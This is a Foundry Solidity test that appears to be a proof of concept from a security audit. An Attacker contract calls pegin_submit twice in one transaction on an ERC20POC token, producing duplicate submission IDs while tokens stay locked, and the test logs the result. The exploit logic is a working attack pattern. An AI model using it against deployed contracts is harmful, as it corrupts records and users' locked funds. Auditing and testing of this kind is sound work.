// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/ERC20POC.sol";

contract TestPegInSubmit is Test {
    ERC20POC token;
    address owner = address(0x1);
    address staff = address(0x3); 
    Attacker attacker;

    function setUp() public {
        vm.startPrank(owner);
        token = new ERC20POC(0, 0, staff, 0, 10, 10);
        uint256 decimals = token.decimals();
        uint256 amount = 200 * (10 ** decimals);
        token.transfer(address(this), amount);
        attacker = new Attacker(token);
        token.transfer(address(attacker), amount);
        vm.stopPrank();
    }

    function testPegInSubmitSameBlockSameUser() public {
        uint256 decimals = token.decimals();
        uint256 amountPerSubmit = 100 * (10 ** decimals);
        console.log("--- BEFORE-Trigger State ---");
        uint256 lockedPOCBefore = token.locked_POC_total();
        uint256 submitListLengthBefore = token.pegin_submit_list(1000, 0).length;
        console.log("Locked POC total before:", lockedPOCBefore);
        console.log("Submit list length before:", submitListLengthBefore);

        console.log("--- Trigger Attack ---");
        // Perform two submissions in same block via attacker contract
        attacker.attack(amountPerSubmit, amountPerSubmit);

        console.log("--- AFTER-Trigger State ---");
        uint256 lockedPOCAfter = token.locked_POC_total();
        uint256 submitListLengthAfter = token.pegin_submit_list(1000, 0).length;
        console.log("Locked POC total after:", lockedPOCAfter);
        console.log("Submit list length after:", submitListLengthAfter);

        // Verify changes
        bool lockedPOCIncreased = lockedPOCAfter > lockedPOCBefore;
        bool submitListExtended = submitListLengthAfter > submitListLengthBefore;
        ERC20POC.pegin_data[] memory submits = token.pegin_submit_list(2, 0);
        bool duplicateExists = (submits.length == 2 && submits[0].id == submits[1].id);

        console.log("Locked POC increased:", lockedPOCIncreased);
        console.log("Submit list extended:", submitListExtended);
        console.log("Duplicate IDs exist:", duplicateExists);

        // Original assertions for test validity
        assertEq(submits.length, 2, "Two submissions expected");
        assertEq(submits[0].id, submits[1].id, "Duplicate keys in submissions");
        assertEq(
            token.locked_POC_total(),
            lockedPOCBefore + (amountPerSubmit * 2),
            "Tokens not properly locked"
        );

        // Vulnerability verdict
        if (duplicateExists) {
            console.log("Vulnerability Exists: Duplicate submissions created and tokens locked");
        } else {
            console.log("Vulnerability not Exist: No duplicate IDs detected after attack");
        }
    }
}

contract Attacker {
    ERC20POC token;
    
    constructor(ERC20POC _token) {
        token = _token;
    }
    
    function attack(uint256 amount1, uint256 amount2) public {
        token.pegin_submit(amount1);
        token.pegin_submit(amount2);
    }
}